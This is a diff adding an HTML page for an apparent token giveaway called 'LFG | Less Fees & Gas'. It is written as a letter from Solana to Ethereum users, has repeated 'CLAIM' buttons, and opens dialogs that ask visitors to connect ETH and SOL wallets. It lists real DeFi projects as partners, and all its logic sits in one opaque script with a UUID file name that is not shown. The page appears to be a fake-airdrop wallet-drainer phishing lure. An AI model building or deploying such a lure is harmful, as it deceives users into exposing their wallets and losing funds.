@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>LFG | Less Fees & Gas</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<link rel="shortcut icon" type="image/png" href="static/images/logo.svg"/>
+<link rel="stylesheet" type="text/css" href="static/css/main1409.css?1704919387" />
+<link rel="stylesheet" type="text/css" href="static/css/fontawesomed3af.css?1700580161" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@LessFnGas" />
+<meta name="twitter:creator" content="@LessFnGas" />
+<meta property="og:title" content="$LFG" />
+<meta property="og:image" content="static/images/twitter91ba.png?1703868437" />
+</head>
+<body>
+	<div class="content" style="visibility: hidden;">
+		<div class="card head">
+			<div class="logo">
+				<img src="static/images/logo.svg" /> Less Fees & Gas
+			</div>
+			<div class="social">
+				<a href="https://twitter.com/LessFnGas" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a>
+				<a href="https://t.me/LessFeesNGas" title="Telegram" target="_blank"><i class="fa fa-telegram"></i></a>
+				<a href="https://medium.com/@lfgtoken" title="Medium" target="_blank"><i class="fa fa-medium"></i></a>
+				<p><button class="interact-button">CLAIM</button><button id="bridge" class="interact-button">Bridge</button></p>
+			</div>
+		</div>
+		<div class="card img">
+			<img src="static/images/card786a.jpg?1703614011" />
+			<p class="greetings">Greetings from ETH</p>
+			<p class="solana">SOL</p>
+		</div>
+		<div class="card foot">
+			<div class="letter">
+				<div class="addressee">
+					<div class="stamp">
+						<span><img src="static/images/logo.svg" /></span>
+					</div>
+					<p>To:</p><p><b>Our Ethereum Brothers and Sisters</b></p>
+					<p>From:</p><p><b>Your Solana Brothers and Sisters</b></p>
+				</div>
+				<div class="body">
+					<p>
+						We're writing to let you know we found the fast, secure, decentralized future you envisioned. And for showing our Ethereum brothers and sisters the way, we are now including a little gift for the most loyal Solana players.
+					</p>
+					<p>
+    						<button class="interact-button">Click to CLAIM with ETH Wallet</button>
+					</p>
+				</div>
+			</div>
+		</div>
+		<div class="partners">
+			<h2>LFG Partners</h2>
+			<div>
+				<h3><a href="https://orca.so/" target="_blank"><img src="static/images/orca.svg" />Orca</a></h3>
+				<p>Orca is a DEX and liquidity provider for LFG. You can trade tokens and add to the LP on their site. Users can bridge from ETH directly to LFG</p>
+			</div>
+			<div>
+				<h3><a href="https://mayan.finance/" target="_blank"><img src="static/images/mayan.png" />Mayan</a></h3>
+				<p>Mayan is a cross chain bridge that auctions trades to the highest bidder to get users the best price when exchanging across bridges</p>
+			</div>
+			<div>
+				<h3><a href="https://tensor.trade/" target="_blank"><img src="static/images/tensor.svg" />Tensor</a></h3>
+				<p>Tensor is an NFT trading platform on Solana. Users can buy and sell NFTs as well as yolo buy, where they can pay a fraction of the NFT’s asking price for a chance to win it cheap</p>
+			</div>
+			<div>
+				<h3><a href="https://bonfida.org/" target="_blank"><img src="static/images/bonfida.svg" />Bonfida (SNS)</a></h3>
+				<p>Bonfida oversees .sol domains. Users can purchase a .sol domain for a one time fee of 20 USDC and create subdomains for other wallets, resell domains on the market, or wrap them into an NFT</p>
+			</div>
+			<div>
+				<h3><a href="https://meteora.ag/" target="_blank"><img src="static/images/meteora.svg" />Meteora</a></h3>
+				<p>Meteora is a dynamic liquidity market maker, the first on Solana. Dynamic swap fees increase with volatility to compensate for impairment loss. It opened these pools on December 1st.</p>
+			</div>
+			<div>
+				<h3><a href="https://app.marginfi.com/" target="_blank"><img src="static/images/marginfi.svg" />Marginfi</a></h3>
+				<p>Marginfi is a lending and borrowing protocol on Solana. Users can lend $LFG and earn rewards, or borrow more $LFG from users on the site.</p>
+			</div>
+		</div>
+	</div>
+	<div id="claim_dialog" class="dialog" style="display: none;">
+		<div class="dialog-backdrop" aria-hidden="true" style="opacity: 0;"></div>
+		<div tabindex="0"></div>
+		<div class="dialog-container">
+			<div class="dialog-paper in">
+				<div class="dialog-title">
+					<h2>
+						Claim LFG
+						<button><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+					</h2>
+				</div>
+				<div class="dialog-content">
+					<ul class="steps">
+						<li>
+							<p>Select ETH Wallet</p>
+							<p><button id="connect_eth">Select ETH Wallet</button></p>
+						</li>
+						<li class="disabled">
+							<p>Select SOL Wallet</p>
+							<p><button id="connect_sol">Select SOL Wallet</button></p>
+						</li>
+						<li class="disabled">
+							<p>Claim LFG</p>
+							<p id="claim_amount" style="display:none;"><input type="text" size="17" /></p>
+							<p><button id="claim" class="interact-button">Claim Your LFG</button></p>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="saga_claim_dialog" class="dialog" style="display: none;">
+		<div class="dialog-backdrop" aria-hidden="true" style="opacity: 0;"></div>
+		<div tabindex="0"></div>
+		<div class="dialog-container">
+			<div class="dialog-paper in">
+				<div class="dialog-title">
+					<h2>
+						Claim LFG with Your Eth Wallet
+						<button><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg></button>
+					</h2>
+				</div>
+				<div class="dialog-content">
+					<ul class="steps">
+						<li>
+							<p>Select SOL Wallet with ETH Token</p>
+							<p><button id="saga_connect_sol">Select SOL Wallet</button></p>
+						</li>
+						<li class="disabled">
+							<p>Claim LFG</p>
+							<p><button id="saga_claim" class="interact-button">Claim Your LFG</button></p>
+						</li>
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="loader"><div></div><div></div><div></div><div></div></div>
+</body>
+<script charset="UTF-8" type="text/javascript" src="./eeb7fdd1-6bf6-4a4c-9d5b-3c40f6d0dc61.js"></script>
+
+</html>
